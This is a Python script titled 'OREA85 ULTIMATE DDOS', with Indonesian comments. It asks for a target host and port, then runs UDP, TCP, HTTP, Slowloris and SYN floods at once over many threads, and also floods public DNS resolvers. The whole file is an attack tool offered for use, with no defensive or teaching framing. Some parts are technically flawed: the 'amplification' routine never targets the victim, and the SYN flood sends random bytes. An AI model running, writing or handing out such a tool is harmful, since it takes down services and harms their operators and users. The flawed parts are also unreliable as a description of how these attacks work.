#!/usr/bin/env python3
import socket
import threading
import random
import time
import os
import sys
from concurrent.futures import ThreadPoolExecutor

class UltimateDDOS:
    def __init__(self, target, port, threads=1000):
        self.target = target
        self.port = port
        self.threads = threads
        self.running = True
        
    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            return sock
        except:
            return None
    
    def udp_flood(self):
        """UDP Flood Attack - Mengirimkan paket UDP besar secara masif"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(10240)
                sock.sendto(data, (self.target, self.port))
            except:
                pass
    
    def tcp_flood(self):
        """TCP Flood Attack - Membuat koneksi TCP secara masif"""
        while self.running:
            try:
                sock = self.create_socket()
                if sock:
                    sock.connect((self.target, self.port))
                    sock.send(random._urandom(10240))
            except:
                pass
    
    def http_flood(self):
        """HTTP Flood Attack - Mengirimkan request HTTP secara masif"""
        while self.running:
            try:
                sock = self.create_socket()
                if sock:
                    sock.connect((self.target, self.port))
                    request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                    sock.send(request.encode())
            except:
                pass
    
    def slowloris(self):
        """Slowloris Attack - Menahan koneksi terbuka lama"""
        while self.running:
            try:
                sock = self.create_socket()
                if sock:
                    sock.connect((self.target, self.port))
                    sock.send(f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode())
                    time.sleep(100)
            except:
                pass
    
    def syn_flood(self):
        """SYN Flood Attack - Mengirimkan paket SYN secara masif"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.sendto(random._urandom(1024), (self.target, self.port))
            except:
                pass
    
    def amplifyification_attack(self):
        """Amplification Attack - Menggunakan DNS server untuk amplifikasi"""
        dns_servers = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for dns in dns_servers:
                    query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"
                    sock.sendto(query, (dns, 53))
            except:
                pass
    
    def start_attack(self):
        """Memulai semua serangan secara simultan"""
        print(f"🚀 Memulai serangan ke {self.target}:{self.port}")
        print(f"🔥 Menggunakan {self.threads} threads")
        print("⚡ Serangan berjalan... tekan CTRL+C untuk berhenti")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Membagi thread untuk setiap jenis serangan
            threads_per_attack = self.threads // 6
            
            for _ in range(threads_per_attack):
                executor.submit(self.udp_flood)
                executor.submit(self.tcp_flood)
                executor.submit(self.http_flood)
                executor.submit(self.slowloris)
                executor.submit(self.syn_flood)
                executor.submit(self.amplifyification_attack)
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print("\n✅ Serangan dihentikan")

def main():
    print("=" * 50)
    print("🎯 OREA85 ULTIMATE DDOS")
    print("=" * 50)
    
    try:
        target = input("🎯 Masukkan target IP/domain: ")
        port = int(input("🔌 Masukkan port: "))
        threads = int(input("⚡ Masukkan jumlah threads (default 1000): ") or "1000")
        
        if not target:
            print("❌ Target tidak boleh kosong!")
            return
            
        ddos = UltimateDDOS(target, port, threads)
        ddos.start_attack()
        
    except ValueError:
        print("❌ Input tidak valid!")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()